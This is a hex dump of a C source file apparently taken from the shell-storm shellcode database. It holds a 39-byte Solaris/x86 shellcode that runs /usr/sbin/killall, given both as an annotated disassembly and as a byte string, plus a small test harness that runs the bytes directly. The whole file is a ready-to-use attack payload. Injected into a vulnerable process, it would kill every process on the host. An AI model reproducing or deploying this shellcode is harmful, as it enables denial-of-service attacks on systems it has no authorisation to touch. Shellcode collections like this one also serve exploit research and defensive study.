00000000  2f 2a 0a 20 54 69 74 6c  65 3a 20 20 20 53 6f 6c  |/*. Title:   Sol|
00000010  61 72 69 73 2f 78 38 36  20 2d 20 53 79 73 74 65  |aris/x86 - Syste|
00000020  6d 56 20 6b 69 6c 6c 61  6c 6c 20 63 6f 6d 6d 61  |mV killall comma|
00000030  6e 64 20 2d 20 33 39 20  62 79 74 65 73 0a 20 41  |nd - 39 bytes. A|
00000040  75 74 68 6f 72 3a 20 20  4a 6f 6e 61 74 68 61 6e  |uthor:  Jonathan|
00000050  20 53 61 6c 77 61 6e 20  3c 73 75 62 6d 69 74 20  | Salwan <submit |
00000060  41 54 20 73 68 65 6c 6c  2d 73 74 6f 72 6d 2e 6f  |AT shell-storm.o|
00000070  72 67 3e 0a 20 57 65 62  3a 20 20 20 20 20 68 74  |rg>. Web:     ht|
00000080  74 70 3a 2f 2f 77 77 77  2e 73 68 65 6c 6c 2d 73  |tp://www.shell-s|
00000090  74 6f 72 6d 2e 6f 72 67  0a 20 54 77 69 74 74 65  |torm.org. Twitte|
000000a0  72 3a 20 68 74 74 70 3a  2f 2f 74 77 69 74 74 65  |r: http://twitte|
000000b0  72 2e 63 6f 6d 2f 6a 6f  6e 61 74 68 61 6e 73 61  |r.com/jonathansa|
000000c0  6c 77 61 6e 0a 0a 20 21  20 44 61 74 61 62 61 73  |lwan.. ! Databas|
000000d0  65 20 6f 66 20 73 68 65  6c 6c 63 6f 64 65 73 3a  |e of shellcodes:|
000000e0  20 68 74 74 70 3a 2f 2f  77 77 77 2e 73 68 65 6c  | http://www.shel|
000000f0  6c 2d 73 74 6f 72 6d 2e  6f 72 67 2f 73 68 65 6c  |l-storm.org/shel|
00000100  6c 63 6f 64 65 2f 0a 0a  20 44 61 74 65 3a 20 20  |lcode/.. Date:  |
00000110  20 20 32 30 31 30 2d 30  36 2d 30 33 0a 20 54 65  |  2010-06-03. Te|
00000120  73 74 65 64 3a 20 20 53  75 6e 4f 53 20 6f 70 65  |sted:  SunOS ope|
00000130  6e 73 6f 6c 61 72 69 73  20 35 2e 31 31 20 73 6e  |nsolaris 5.11 sn|
00000140  76 5f 31 31 31 62 20 69  38 36 70 63 20 69 33 38  |v_111b i86pc i38|
00000150  36 20 69 38 36 70 63 20  53 6f 6c 61 72 69 73 0a  |6 i86pc Solaris.|
00000160  0a 20 20 20 6b 69 6c 6c  61 6c 6c 35 20 69 73 20  |.   killall5 is |
00000170  74 68 65 20 53 79 73 74  65 6d 56 20 6b 69 6c 6c  |the SystemV kill|
00000180  61 6c 6c 20 63 6f 6d 6d  61 6e 64 2e 20 49 74 20  |all command. It |
00000190  73 65 6e 64 73 20 61 20  73 69 67 6e 61 6c 20 74  |sends a signal t|
000001a0  6f 20 61 6c 6c 20 70 72  6f 63 65 73 73 65 73 20  |o all processes |
000001b0  0a 20 20 20 65 78 63 65  70 74 20 74 68 65 20 70  |.   except the p|
000001c0  72 6f 63 65 73 73 65 73  20 69 6e 20 69 74 73 20  |rocesses in its |
000001d0  6f 77 6e 20 73 65 73 73  69 6f 6e 2c 20 73 6f 20  |own session, so |
000001e0  69 74 20 77 6f 6e 27 74  20 6b 69 6c 6c 20 74 68  |it won't kill th|
000001f0  65 20 73 68 65 6c 6c 20  74 68 61 74 20 69 73 20  |e shell that is |
00000200  0a 20 20 20 72 75 6e 6e  69 6e 67 20 74 68 65 20  |.   running the |
00000210  73 63 72 69 70 74 20 69  74 20 77 61 73 20 63 61  |script it was ca|
00000220  6c 6c 65 64 20 66 72 6f  6d 2e 20 49 74 73 20 70  |lled from. Its p|
00000230  72 69 6d 61 72 79 20 28  6f 6e 6c 79 29 20 75 73  |rimary (only) us|
00000240  65 20 69 73 20 69 6e 20  74 68 65 20 72 63 20 0a  |e is in the rc .|
00000250  20 20 20 73 63 72 69 70  74 73 20 66 6f 75 6e 64  |   scripts found|
00000260  20 69 6e 20 74 68 65 20  2f 65 74 63 2f 69 6e 69  | in the /etc/ini|
00000270  74 2e 64 20 64 69 72 65  63 74 6f 72 79 2e 0a 0a  |t.d directory...|
00000280  0a 20 73 65 63 74 69 6f  6e 20 2e 74 65 78 74 0a  |. section .text.|
00000290  20 20 20 20 30 78 38 30  34 38 30 37 34 3a 20 20  |    0x8048074:  |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 33 31 20 63  |            31 c|
000002b0  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |0              x|
000002c0  6f 72 6c 20 20 20 25 65  61 78 2c 25 65 61 78 0a  |orl   %eax,%eax.|
000002d0  20 20 20 20 30 78 38 30  34 38 30 37 36 3a 20 20  |    0x8048076:  |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 35 30 20 20  |            50  |
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000300  75 73 68 6c 20 20 25 65  61 78 0a 20 20 20 20 30  |ushl  %eax.    0|
00000310  78 38 30 34 38 30 37 37  3a 20 20 20 20 20 20 20  |x8048077:       |
00000320  20 20 20 20 20 20 20 36  61 20 36 63 20 20 20 20  |       6a 6c    |
00000330  20 20 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |          pushl |
00000340  20 24 30 78 36 63 0a 20  20 20 20 30 78 38 30 34  | $0x6c.    0x804|
00000350  38 30 37 39 3a 20 20 20  20 20 20 20 20 20 20 20  |8079:           |
00000360  20 20 20 36 38 20 36 63  20 36 63 20 36 31 20 36  |   68 6c 6c 61 6|
00000370  63 20 20 20 20 20 70 75  73 68 6c 20 20 24 30 78  |c     pushl  $0x|
00000380  36 63 36 31 36 63 36 63  0a 20 20 20 20 30 78 38  |6c616c6c.    0x8|
00000390  30 34 38 30 37 65 3a 20  20 20 20 20 20 20 20 20  |04807e:         |
000003a0  20 20 20 20 20 36 38 20  36 65 20 32 66 20 36 62  |     68 6e 2f 6b|
000003b0  20 36 39 20 20 20 20 20  70 75 73 68 6c 20 20 24  | 69     pushl  $|
000003c0  30 78 36 39 36 62 32 66  36 65 0a 20 20 20 20 30  |0x696b2f6e.    0|
000003d0  78 38 30 34 38 30 38 33  3a 20 20 20 20 20 20 20  |x8048083:       |
000003e0  20 20 20 20 20 20 20 36  38 20 32 66 20 37 33 20  |       68 2f 73 |
000003f0  36 32 20 36 39 20 20 20  20 20 70 75 73 68 6c 20  |62 69     pushl |
00000400  20 24 30 78 36 39 36 32  37 33 32 66 0a 20 20 20  | $0x6962732f.   |
00000410  20 30 78 38 30 34 38 30  38 38 3a 20 20 20 20 20  | 0x8048088:     |
00000420  20 20 20 20 20 20 20 20  20 36 38 20 32 66 20 37  |         68 2f 7|
00000430  35 20 37 33 20 37 32 20  20 20 20 20 70 75 73 68  |5 73 72     push|
00000440  6c 20 20 24 30 78 37 32  37 33 37 35 32 66 0a 20  |l  $0x7273752f. |
00000450  20 20 20 30 78 38 30 34  38 30 38 64 3a 20 20 20  |   0x804808d:   |
00000460  20 20 20 20 20 20 20 20  20 20 20 38 39 20 65 33  |           89 e3|
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000480  76 6c 20 20 20 25 65 73  70 2c 25 65 62 78 0a 20  |vl   %esp,%ebx. |
00000490  20 20 20 30 78 38 30 34  38 30 38 66 3a 20 20 20  |   0x804808f:   |
000004a0  20 20 20 20 20 20 20 20  20 20 20 35 30 20 20 20  |           50   |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000004c0  73 68 6c 20 20 25 65 61  78 0a 20 20 20 20 30 78  |shl  %eax.    0x|
000004d0  38 30 34 38 30 39 30 3a  20 20 20 20 20 20 20 20  |8048090:        |
000004e0  20 20 20 20 20 20 35 33  20 20 20 20 20 20 20 20  |      53        |
000004f0  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
00000500  25 65 62 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%ebx.    0x80480|
00000510  39 31 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |91:             |
00000520  20 38 39 20 65 32 20 20  20 20 20 20 20 20 20 20  | 89 e2          |
00000530  20 20 20 20 6d 6f 76 6c  20 20 20 25 65 73 70 2c  |    movl   %esp,|
00000540  25 65 64 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%edx.    0x80480|
00000550  39 33 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |93:             |
00000560  20 35 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 50             |
00000570  20 20 20 20 70 75 73 68  6c 20 20 25 65 61 78 0a  |    pushl  %eax.|
00000580  20 20 20 20 30 78 38 30  34 38 30 39 34 3a 20 20  |    0x8048094:  |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 35 32 20 20  |            52  |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000005b0  75 73 68 6c 20 20 25 65  64 78 0a 20 20 20 20 30  |ushl  %edx.    0|
000005c0  78 38 30 34 38 30 39 35  3a 20 20 20 20 20 20 20  |x8048095:       |
000005d0  20 20 20 20 20 20 20 35  33 20 20 20 20 20 20 20  |       53       |
000005e0  20 20 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |          pushl |
000005f0  20 25 65 62 78 0a 20 20  20 20 30 78 38 30 34 38  | %ebx.    0x8048|
00000600  30 39 36 3a 20 20 20 20  20 20 20 20 20 20 20 20  |096:            |
00000610  20 20 62 30 20 33 62 20  20 20 20 20 20 20 20 20  |  b0 3b         |
00000620  20 20 20 20 20 6d 6f 76  62 20 20 20 24 30 78 33  |     movb   $0x3|
00000630  62 2c 25 61 6c 0a 20 20  20 20 30 78 38 30 34 38  |b,%al.    0x8048|
00000640  30 39 38 3a 20 20 20 20  20 20 20 20 20 20 20 20  |098:            |
00000650  20 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |  50            |
00000660  20 20 20 20 20 70 75 73  68 6c 20 20 25 65 61 78  |     pushl  %eax|
00000670  0a 20 20 20 20 30 78 38  30 34 38 30 39 39 3a 20  |.    0x8048099: |
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 63 64 20  |             cd |
00000690  39 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |91              |
000006a0  69 6e 74 20 20 20 20 24  30 78 39 31 0a 0a 2a 2f  |int    $0x91..*/|
000006b0  0a 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000006c0  6f 2e 68 3e 0a 0a 63 68  61 72 20 73 63 5b 5d 20  |o.h>..char sc[] |
000006d0  3d 20 22 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |= "\x31\xc0\x50\|
000006e0  78 36 61 5c 78 36 63 5c  78 36 38 5c 78 36 63 5c  |x6a\x6c\x68\x6c\|
000006f0  78 36 63 5c 78 36 31 5c  78 36 63 22 0a 20 20 20  |x6c\x61\x6c".   |
00000700  20 20 20 20 20 20 20 20  20 22 5c 78 36 38 5c 78  |         "\x68\x|
00000710  36 65 5c 78 32 66 5c 78  36 62 5c 78 36 39 5c 78  |6e\x2f\x6b\x69\x|
00000720  36 38 5c 78 32 66 5c 78  37 33 5c 78 36 32 5c 78  |68\x2f\x73\x62\x|
00000730  36 39 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |69".            |
00000740  22 5c 78 36 38 5c 78 32  66 5c 78 37 35 5c 78 37  |"\x68\x2f\x75\x7|
00000750  33 5c 78 37 32 5c 78 38  39 5c 78 65 33 5c 78 35  |3\x72\x89\xe3\x5|
00000760  30 5c 78 35 33 5c 78 38  39 22 0a 20 20 20 20 20  |0\x53\x89".     |
00000770  20 20 20 20 20 20 20 22  5c 78 65 32 5c 78 35 30  |       "\xe2\x50|
00000780  5c 78 35 32 5c 78 35 33  5c 78 62 30 5c 78 33 62  |\x52\x53\xb0\x3b|
00000790  5c 78 35 30 5c 78 63 64  5c 78 39 31 22 3b 0a 0a  |\x50\xcd\x91";..|
000007a0  69 6e 74 20 6d 61 69 6e  28 76 6f 69 64 29 0a 7b  |int main(void).{|
000007b0  0a 20 20 20 20 20 20 20  20 66 70 72 69 6e 74 66  |.        fprintf|
000007c0  28 73 74 64 6f 75 74 2c  22 4c 65 6e 67 74 68 3a  |(stdout,"Length:|
000007d0  20 25 64 5c 6e 22 2c 73  74 72 6c 65 6e 28 73 63  | %d\n",strlen(sc|
000007e0  29 29 3b 0a 20 20 20 20  20 20 20 20 28 2a 28 76  |));.        (*(v|
000007f0  6f 69 64 28 2a 29 28 29  29 20 73 63 29 28 29 3b  |oid(*)()) sc)();|
00000800  0a 0a 72 65 74 75 72 6e  20 30 3b 0a 7d           |..return 0;.}|
0000080d
